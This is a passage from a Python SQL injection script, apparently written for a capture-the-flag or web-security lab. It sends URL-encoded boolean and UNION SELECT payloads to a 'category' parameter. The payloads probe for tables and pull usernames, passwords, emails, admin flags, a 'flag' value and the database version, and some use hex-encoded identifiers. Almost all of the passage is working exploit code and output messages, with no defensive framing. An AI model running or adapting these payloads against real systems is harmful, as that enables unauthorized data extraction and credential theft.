baseline_result = requests.get(f"{target}?category=Gifts", headers=headers, timeout=10)
baseline_size = len(baseline_result.text)
print(f"[!] Baseline size: {baseline_size} bytes")

boolean_tests = [
    {"payload": "%27%20AND%20%28SELECT%20COUNT%28%2a%29%20FROM%20information_schema.tables%29%3E0--", "desc": "Check if tables exist"},
    {"payload": "%27%20AND%20%28SELECT%20COUNT%28%2a%29%20FROM%20users%29%3E0--", "desc": "Check if users table exists"},
    {"payload": "%27%20AND%20%28SELECT%20COUNT%28flag%29%20FROM%20flag%29%3E0--", "desc": "Check if flag table exists"},
]

for test in boolean_tests:
    result = test_payload(test["payload"], test["desc"])
    if result.get('size', 0) != baseline_size:
        print(f"[!] SIZE DIFFERENCE: {result.get('size', 0)} vs {baseline_size} - Boolean injection working!")

# Test 7: Try extracting specific data with different table/column assumptions
print("\n" + "=" * 80)
print("TEST 7: Targeted Data Extraction")
print("=" * 80)

targeted_tests = [
    # Try different table structures that might exist
    {"payload": "%27%20UNION%20SELECT%20id%2cname%2cdescription%2ccategory%2cauthor%20FROM%20posts%20LIMIT%202--", "desc": "Extract from posts"},
    {"payload": "%27%20UNION%20SELECT%20id%2ctitle%2ccontent%2ccreated_at%2cupdated_at%20FROM%20articles%20LIMIT%202--", "desc": "Extract from articles"},
    {"payload": "%27%20UNION%20SELECT%20id%2cusername%2cpassword%2cemail%2cis_admin%20FROM%20users%20LIMIT%202--", "desc": "Extract from users"},
    {"payload": "%27%20UNION%20SELECT%20%2a%20FROM%20flag%20LIMIT%201--", "desc": "Extract all from flag"},
    {"payload": "%27%20UNION%20SELECT%20flag%2cNULL%2cNULL%2cNULL%2cNULL%20FROM%20flag%20LIMIT%201--", "desc": "Extract flag column"},
    {"payload": "%27%20UNION%20SELECT%20CONCAT%28flag%2c%27%20%27%2c%28SELECT%20@@version%29%29%2cNULL%2cNULL%2cNULL%2cNULL%20FROM%20flag%20LIMIT%201--", "desc": "Flag with version"},
]

for test in targeted_tests:
    result = test_payload(test["payload"], test["desc"])
    if result.get('success'):
        print(f"[!!!] SUCCESS: {test['desc']}")
        break
    time.sleep(0.3)

# Test 8: Hex encoded table/field names
print("\n" + "=" * 80)
print("TEST 8: Hex Encoded Identifiers")
print("=" * 80)

hex_tests = [
    {"payload": "%27%20UNION%20SELECT%201%2c2%2c3%2c4%2c5%20FROM%200x666c6167--", "desc": "Hex table name (flag)"},  # 0x666c6167 = 'flag'
    {"payload": "%27%20UNION%20SELECT%200x666c6167%2c2%2c3%2c4%2c5--", "desc": "Hex value"},  # 0x666c6167 = 'flag'
]

for test in hex_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

print("\n" + "=" * 80)
print("TESTING COMPLETE")
print("=" * 80)
print("If any technique showed size anomalies or extracted data, use that approach.")
